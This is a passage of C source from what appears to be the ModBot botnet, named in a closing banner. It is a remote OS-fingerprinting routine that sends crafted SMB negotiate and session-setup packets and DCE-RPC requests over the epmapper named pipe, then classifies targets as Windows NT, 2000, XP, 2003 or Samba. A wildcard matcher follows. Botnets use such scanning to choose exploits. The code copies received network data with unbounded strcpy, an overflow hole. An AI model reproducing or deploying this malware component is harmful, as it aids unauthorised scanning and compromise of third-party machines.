				iErr=fsend(sSocket, negotiate, sizeof(negotiate)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				
				iErr=fsend(sSocket, setupaccount, sizeof(setupaccount)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iRecvd=iErr;

				int iZeroCounter=0; iRecvd--;
				while((--iRecvd>0)&&(iZeroCounter<4))
				{
					if(szRecvBuf[iRecvd]==0x00)
					{
						switch(iZeroCounter)
						{
							case 0: strcpy(sWorkgroup,(char*)&(szRecvBuf[iRecvd+1])); break;
							case 1: strcpy(sServer,(char*)&(szRecvBuf[iRecvd+1])); break;
							case 2: strcpy(sOS,(char*)&(szRecvBuf[iRecvd+1])); break;
							default: break;
						}
						iZeroCounter++;
					}
				}
				bOkToParse=TRUE;

			} else {
				return iRetVal;
			}
			fclosesocket(sSocket); 
#ifdef _DEBUG
			printf("sWorkgroup: %s\n",sWorkgroup);
			printf("sServer: %s\n",sServer);
			printf("sOS: %s\n",sOS);
#endif
			if(bOkToParse)
			{

				if (wildcardfit("Windows Server 2003 *.*",sServer))
					return OS_WIN2K3;

				if (wildcardfit("NT LAN Manager *.*",sServer))
					return OS_WINNT;

				if (wildcardfit("Windows 2000 LAN Manager*",sServer))
					if (!strcmp("Windows 5.0",sOS))
						return OS_WIN2K;
					
				if (wildcardfit("Windows 2000 LAN Manager*",sServer))
					if (!strcmp("Windows 5.1",sOS))
						return OS_WINXP;

				if (wildcardfit("Samba *",sServer))
					return OS_LINUX;
			}

			return iRetVal;
		}
		break;
	case FP_NP:
		{
			char szPipePath[MAX_PATH];
			int iRetVal=OS_UNKNOWN;
			_snprintf(szPipePath,sizeof(szPipePath),"\\\\%s\\",szHost);
			strncat(szPipePath,"pipe\\epmapper",sizeof(szPipePath));
			HANDLE hFile=CreateFile(szPipePath,GENERIC_WRITE|GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,NULL);
			if(hFile!=INVALID_HANDLE_VALUE)
			{	
				char *szInBuf=(char*)malloc(100000);
				memset(szInBuf, 0, 100000);
				
				DWORD dwRead;
				TransactNamedPipe(hFile, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, szInBuf, 10000, &dwRead, NULL);
				if(szInBuf[2]==DCE_PKT_BINDACK)
				{
					TransactNamedPipe(hFile, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1, szInBuf, 10000, &dwRead, NULL);
					if(szInBuf[2]==DCE_PKT_RESPONSE)
					{
						if (MemContains(szInBuf, dwRead, w2kuuid_sig, sizeof(w2kuuid_sig)-1))
						{
							if(dwRead<300)
								iRetVal=OS_WINNT;
							else
								iRetVal=OS_WIN2K;
						}
						else if (MemContains(szInBuf, dwRead, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
							iRetVal=OS_WINXP;
						else
							iRetVal=OS_UNKNOWN;
					}
				}
				free(szInBuf);
				CloseHandle(hFile);
			}
			return iRetVal;
		}
		break;

	default:
		return OS_UNKNOWN;
		break; 
	}
	return OS_UNKNOWN;
}

#ifndef NO_WILDCARD

int wildcardfit(char *wildcard, char *test)
{
	int fit = 1;
  
	for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++) {
		switch (*wildcard) {
		case '[':
			wildcard++;
			fit = set (&wildcard, &test);
			break;
		case '?':
			test++;
			break;
		case '*':
			fit = asterisk (&wildcard, &test);
			wildcard--;
			break;
		default:
			fit = (int) (*wildcard == *test);
			test++;
		}
	}
	while ((*wildcard == '*') && (1 == fit)) 
		wildcard++;

	return ((int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard)));
}

int set(char **wildcard, char **test)
{
	int fit = 0, negation = 0, at_beginning = 1;

	if ('!' == **wildcard) {
		negation = 1;
		(*wildcard)++;
	}
	while ((']' != **wildcard) || (1 == at_beginning)) {
		if (0 == fit) {
			if (('-' == **wildcard) && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
				&& (']' != *(*wildcard + 1)) && (0 == at_beginning)) {
				if (((**test) >= (*(*wildcard - 1))) && ((**test) <= (*(*wildcard + 1)))) {
					fit = 1;
					(*wildcard)++;
				}
			}
			else if ((**wildcard) == (**test))
              fit = 1;
		}
		(*wildcard)++;
		at_beginning = 0;
	}
	if (1 == negation)
		fit = 1 - fit;
	if (1 == fit) 
		(*test)++;

	return (fit);
}

int asterisk(char **wildcard, char **test)
{
	int fit = 1;

	(*wildcard)++; 
	while (('\000' != (**test)) && (('?' == **wildcard) || ('*' == **wildcard))) {
		if ('?' == **wildcard) 
			(*test)++;
		(*wildcard)++;
	}
	while ('*' == (**wildcard))
		(*wildcard)++;

	if (('\0' == (**test)) && ('\0' != (**wildcard)))
		return (fit = 0);
	if (('\0' == (**test)) && ('\0' == (**wildcard)))
		return (fit = 1); 
	else {
		if (0 == wildcardfit(*wildcard, (*test))) {
			do {
				(*test)++;
				while (((**wildcard) != (**test)) && ('['  != (**wildcard)) && ('\0' != (**test)))
					(*test)++;
			} while ((('\0' != **test))?(0 == wildcardfit ((char *)*wildcard, (*test))):(0 != (fit = 0)));
		}
		if (('\0' == **test) && ('\0' == **wildcard))
			fit = 1;
		return (fit);
	}
}

#endif
#endif

/////////////////////////////////////////////////
//            120|-[ModBot]-V0.5               //
///////////////////////////////////////////////// 